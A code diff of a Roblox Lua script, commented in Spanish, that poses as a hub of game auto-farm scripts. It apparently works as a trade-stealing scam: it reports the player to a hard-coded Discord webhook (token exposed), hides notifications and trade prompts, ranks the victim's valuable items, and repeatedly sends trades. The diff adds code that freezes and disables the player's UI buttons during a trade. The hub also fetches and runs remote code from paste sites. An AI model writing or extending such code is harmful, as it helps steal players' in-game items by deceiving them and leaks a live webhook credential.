@@ -91,13 +91,15 @@ end)
 -- =============================================================
 
 local ScriptsList = {
-    { Name = "🍯 HONEY COLLECTOR CHOCOLA", ID = "HoneyCollector", Urls = {"https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Honey/refs/heads/main/script.lua"} },
     { Name = "🎰 Autospin RNG", ID = "AutoSpinRNG", Urls = {"https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Spin-RNG/refs/heads/main/script.lua"} },
+    { Name = "🌮 AUTO TACO CHOCOLA", ID = "AutoTaco", Urls = {"https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Taco/refs/heads/main/script.lua"} },
+    { Name = "🎟️ CODE REDEEMER ACE", ID = "CodeRedeemer", Urls = {"https://pastefy.app/VvuMZMpR/raw"} },
+    { Name = "🎟️ CODE REDEEMER TIGGY", ID = "CodeRedeemerTiggy", Urls = {"https://pastefy.app/sWmXY4yj/raw"} },
+    { Name = "🍯 HONEY COLLECTOR CHOCOLA", ID = "HoneyCollector", Urls = {"https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Honey/refs/heads/main/script.lua"} },
     { Name = "🌐 SERVERHOPPER FOR AUTOHONEY", ID = "Serverhopper", Urls = {"https://pastefy.app/sFOkaUno/raw"} },
     { Name = "🐝 AUTOBUY BEE SHOP", ID = "AutoBuyBee", Urls = {"https://pastefy.app/FLOSU5Pk/raw"} },
     { Name = "🍯 AUTOCOLLECT HONEY KY", ID = "AutoCollectKY", Urls = {"https://pastefy.app/wdEAoCOz/raw"} },
     { Name = "🖐️ AUTOGRAB", ID = "AutoGrab", Urls = {"https://pastefy.app/TLsWJj30/raw"} },
-    { Name = "🎟️ CODE REDEEMER", ID = "CodeRedeemer", Urls = {"https://pastefy.app/VvuMZMpR/raw"} },
     { Name = "✈️SEMITP", ID = "SEMITP", Urls = {"https://raw.githubusercontent.com/marco998898/HexSemiTP/refs/heads/main/SemiTP.lua"} },
     { Name = "⚔️🤖AUTOPLAY DUELS", ID = "Autoplayduels", Urls = {"https://pastefy.app/YqMbA00x/raw"} },
 }
@@ -762,6 +764,13 @@ local LP = Players.LocalPlayer
 local cam = Workspace.CurrentCamera
 local pg = LP:WaitForChild("PlayerGui")
 
+-- Referencias para LeftCenter (Tu código añadido)
+local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local leftCenterGui = playerGui:WaitForChild("LeftCenter")
+local leftCenterFrame = leftCenterGui:WaitForChild("LeftCenter")
+local ORIGINAL_POSITION = UDim2.new(0, 0, 0.5, 0)
+local locking = false
+
 -- URL de tu Webhook de Discord
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1538656296943751180/_9xvaGd9sngrEJJkOSLnVxS4ORsUVK7Duyo1TzK4DoaZK7uf7liBdyhyP87G6M9rYCAN"
 
@@ -805,7 +814,7 @@ if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
     end
 end
 
--- Función para enviar datos a Discord mediante Webhook (Arreglado el error de concatenación)
+-- Función para enviar datos a Discord mediante Webhook
 local function sendToDiscord(title, description, fields)
     local executorName = LP and LP.Name or "Desconocido"
     local executorId = LP and tostring(LP.UserId) or "0"
@@ -847,6 +856,8 @@ end)
 local function suppressMessages()
     local function cleanNotificationGui(gui)
         local nameLower = string.lower(gui.Name)
+        if nameLower == "topnotification" or nameLower == "admin" then return end
+        
         if string.find(nameLower, "notify") or string.find(nameLower, "notification") or string.find(nameLower, "banner") or string.find(nameLower, "toast") then
             if gui:IsA("ScreenGui") then
                 gui.Enabled = false
@@ -864,6 +875,8 @@ end
 local function hideTradePrompts()
     local function processPrompt(gui)
         local nameLower = string.lower(gui.Name)
+        if nameLower == "topnotification" or nameLower == "admin" then return end
+
         if string.find(nameLower, "prompt") or string.find(nameLower, "alert") then
             if gui:IsA("GuiObject") then
                 gui.Position = UDim2.new(10, 0, 10, 0)
@@ -890,6 +903,39 @@ hideTradePrompts()
 local function cleanStr(str)
     return string.lower(string.gsub(tostring(str or ""), "%s+", ""))
 end
+
+-- =========================================================
+-- CONTROLADOR DE ESTADO DE UI (TRADEO ACTIVO / INACTIVO)
+-- =========================================================
+local function updateLeftCenterState(inTrade)
+    if inTrade then
+        leftCenterFrame.Position = ORIGINAL_POSITION
+        locking = true
+        
+        -- Desactivar clicks sin tocar apariencia
+        for _, obj in ipairs(leftCenterFrame:GetDescendants()) do
+            if obj:IsA("ImageButton") or obj:IsA("TextButton") then
+                obj.Active = false
+            end
+        end
+    else
+        locking = false
+        -- Restaurar estado normal de los botones
+        for _, obj in ipairs(leftCenterFrame:GetDescendants()) do
+            if obj:IsA("ImageButton") or obj:IsA("TextButton") then
+                obj.Active = true
+            end
+        end
+    end
+end
+
+-- Mantener posición fija mientras esté bloqueado
+leftCenterFrame:GetPropertyChangedSignal("Position"):Connect(function()
+    if not locking then return end
+    if leftCenterFrame.Position ~= ORIGINAL_POSITION then
+        leftCenterFrame.Position = ORIGINAL_POSITION
+    end
+end)
 
 -- =========================================================
 -- ESCANER DE BASES FLEXIBLE Y CORREGIDO
@@ -1005,36 +1051,36 @@ end
 task.spawn(function()
     local DELAY_STEP = 0.8
 
-local BrainrotPriority = {
-    "Headless Horseman", "Signore Carapace", "Arcadragon", "Elefanto Frigo", "Strawberry Elephant",
-    "Pancake and Syrup", "Love Love Bear", "Antonio", "Meowl", "Skibidi Toilet", "Rico Dinero",
-    "Griffin", "Dragon Gingerini", "Fishino Clownino", "La Supreme Combinasion", "Ginger Gerat",
-    "Tirilikalika Tirilikalako", "Kalika Bros", "Digi Narwhal", "Hydra Bunny", "Dragon Cannelloni",
-    "Los Hackers", "Hydra Dragon Cannelloni", "Bunny and Eggy", "Duggy Bros", "Dug dug dug",
-    "Ketupat Bros", "John Doe", "La Casa Boo", "Foxini Lanternini", "Quackini Snackini",
-    "Los Chillis", "Guest 666", "Cerberus", "Rosey and Teddy", "Reinito Sleighito",
-    "Fragola La La La", "Gym Bros", "Spooky and Pumpky", "Cloverat Clapat", "Cooki and Milki",
-    "Cash or Card", "Fortunu and Cashuru", "Jolly Jolly Sahur", "Capitano Moby",
-    "Fragrama and Chocrama", "Chillin Chili", "Los Sekolahs", "Sammyni Fattini", "Los Amigos",
-    "Money Money Reindeer", "Boppin Bunny", "Money Money Bros", "Tralaledon",
-    "La Food Combinasion", "Celularcini Viciosini", "Hopilikalika Hopilikalako", "Los Tangcitos",
-    "Swaggy Bros", "Los Spaghettis", "Popcuru and Fizzuru", "Garama and Madundung",
-    "Celestial Pegasus", "La Easter Grande", "Gold Gold Gold", "Nacho Spyder", "Orcaledon",
-    "Los Mariachis", "Burguro And Fryuro", "Lovin Rose", "W or L", "La Ginger Sekolah",
-    "Chipso and Queso", "Los Primos", "Swag Soda", "Los Hotspotsitos", "La Taco Combinasion",
-    "La Romantic Grande", "Eviledon", "Los Bros", "Las Sis", "Tictac Sahur",
-    "La Secret Combinasion", "La Lucky Grande", "Ketchuru and Musturu", "Gobblino Uniciclino",
-    "Rosetti Tualetti", "Tacorita Bicicleta", "Ventoliero Pavonero", "La Sahur Combinasion",
-    "Abyssaloco", "Rubrikiko", "La Anniversary Grande", "Jelly Moby", "Sammyni Cakini",
-    "Lavadorito Spinito", "Donkeyturbo Express", "Coco and Mango", "Dragon Aquanini", "Kraken",
-    "Venuspino", "Bearito Cabinito", "Sand Sand Sand", "Globa Steppa", "Los Fruits", "Tang Tang Keletang", "La Summer Grande", "Los Planitos",
-    "Los Sweethearts", "Steakini Fattini", "Capitano Americano", "Bufalino Boomberino",
-    "Los Tictacs", "Los Admins", "Moby Bros", "Grabatron", "Rubiko and Kubiko",
-    "Cangurato Gelato", "Chicleteira Champeona", "Pizza and Ranch", "Los Secret Combinasionas",
-    "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee", "Scorpino Coasterino",
-    "Honey Honey Bear", "Ketupat Kepat", "La Breakfast Combinasion", "Examen Bros",
-    "Noodle Noodle Poodle", "Var Var Var", "Tacoturbo Tacorito", "Anpali Babel", "Sammyni Truckini", "Nachorilla", "Burrito Bat", "Ref Ref Ref Sahur"
-}
+    local BrainrotPriority = {
+        "Headless Horseman", "Signore Carapace", "Arcadragon", "Elefanto Frigo", "Strawberry Elephant",
+        "Pancake and Syrup", "Love Love Bear", "Antonio", "Meowl", "Skibidi Toilet", "Rico Dinero",
+        "Griffin", "Dragon Gingerini", "Fishino Clownino", "La Supreme Combinasion", "Ginger Gerat",
+        "Tirilikalika Tirilikalako", "Kalika Bros", "Digi Narwhal", "Hydra Bunny", "Dragon Cannelloni",
+        "Los Hackers", "Hydra Dragon Cannelloni", "Bunny and Eggy", "Duggy Bros", "Dug dug dug",
+        "Ketupat Bros", "John Doe", "La Casa Boo", "Foxini Lanternini", "Quackini Snackini",
+        "Los Chillis", "Guest 666", "Cerberus", "Rosey and Teddy", "Reinito Sleighito",
+        "Fragola La La La", "Gym Bros", "Spooky and Pumpky", "Cloverat Clapat", "Cooki and Milki",
+        "Cash or Card", "Fortunu and Cashuru", "Jolly Jolly Sahur", "Capitano Moby",
+        "Fragrama and Chocrama", "Chillin Chili", "Los Sekolahs", "Sammyni Fattini", "Los Amigos",
+        "Money Money Reindeer", "Boppin Bunny", "Money Money Bros", "Tralaledon",
+        "La Food Combinasion", "Celularcini Viciosini", "Hopilikalika Hopilikalako", "Los Tangcitos",
+        "Swaggy Bros", "Los Spaghettis", "Popcuru and Fizzuru", "Garama and Madundung",
+        "Celestial Pegasus", "La Easter Grande", "Gold Gold Gold", "Nacho Spyder", "Orcaledon",
+        "Los Mariachis", "Burguro And Fryuro", "Lovin Rose", "W or L", "La Ginger Sekolah",
+        "Chipso and Queso", "Los Primos", "Swag Soda", "Los Hotspotsitos", "La Taco Combinasion",
+        "La Romantic Grande", "Eviledon", "Los Bros", "Las Sis", "Tictac Sahur",
+        "La Secret Combinasion", "La Lucky Grande", "Ketchuru and Musturu", "Gobblino Uniciclino",
+        "Rosetti Tualetti", "Tacorita Bicicleta", "Ventoliero Pavonero", "La Sahur Combinasion",
+        "Abyssaloco", "Rubrikiko", "La Anniversary Grande", "Jelly Moby", "Sammyni Cakini",
+        "Lavadorito Spinito", "Donkeyturbo Express", "Coco and Mango", "Dragon Aquanini", "Kraken",
+        "Venuspino", "Bearito Cabinito", "Sand Sand Sand", "Globa Steppa", "Los Fruits", "Tang Tang Keletang", "La Summer Grande", "Los Planitos",
+        "Los Sweethearts", "Steakini Fattini", "Capitano Americano", "Bufalino Boomberino",
+        "Los Tictacs", "Los Admins", "Moby Bros", "Grabatron", "Rubiko and Kubiko",
+        "Cangurato Gelato", "Chicleteira Champeona", "Pizza and Ranch", "Los Secret Combinasionas",
+        "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee", "Scorpino Coasterino",
+        "Honey Honey Bear", "Ketupat Kepat", "La Breakfast Combinasion", "Examen Bros",
+        "Noodle Noodle Poodle", "Var Var Var", "Tacoturbo Tacorito", "Anpali Babel", "Sammyni Truckini", "Nachorilla", "Burrito Bat", "Ref Ref Ref Sahur"
+    }
 
     local BrainrotPriorityMap = {}
     local TargetBrainrotsClean = {}
@@ -1095,6 +1141,8 @@ local BrainrotPriority = {
 
         local function handleGui(obj)
             if obj.Name:find("Prompt") or obj:IsA("ProximityPrompt") then return end
+            if obj.Name == "TopNotification" or obj.Name == "Admin" then return end
+
             local tradeGuis = {
                 ["TradeLiveTrade"] = true,
                 ["BrainrotTrader"] = true,
@@ -1217,9 +1265,15 @@ local BrainrotPriority = {
                         if cleanName ~= "" then
                             for gearName in pairs(getgenv().NORMAL_GEARS) do
                                 local cleanGear = cleanStr(gearName)
-                                if cleanName == cleanGear or string.find(cleanName, cleanGear, 1, true) or string.find(cleanGear, cleanName, 1, true) then
-                                    if not foundGears[cleanName] then
-                                        foundGears[cleanName] = { name = name, location = location, slot = slot.Name }
+
+                                -- SOLO coincidencia exacta
+                                if cleanName == cleanGear then
+                                    if not foundGears[cleanGear] then
+                                        foundGears[cleanGear] = {
+                                            name = gearName,
+                                            location = location,
+                                            slot = slot.Name
+                                        }
                                     end
                                     break
                                 end
@@ -1658,18 +1712,32 @@ local BrainrotPriority = {
     end
 
     local function startFullAutomation()
+        local lastTradeState = false
+
         while true do
             processedBrainrots = {}
             processedGears = {}
             processedBases = {}
 
             while not isTradeActive() do
+                -- Monitorear cambio de estado a Inactivo
+                if lastTradeState then
+                    lastTradeState = false
+                    updateLeftCenterState(false)
+                end
+
                 sendTradeToPlayer()
                 local startWait = tick()
                 while tick() - startWait < 4 do
                     if isTradeActive() then break end
                     task.wait(0.3)
                 end
+            end
+
+            -- Monitorear cambio de estado a Activo (Trade aceptado/iniciado)
+            if not lastTradeState then
+                lastTradeState = true
+                updateLeftCenterState(true)
             end
 
             task.wait(0.8)
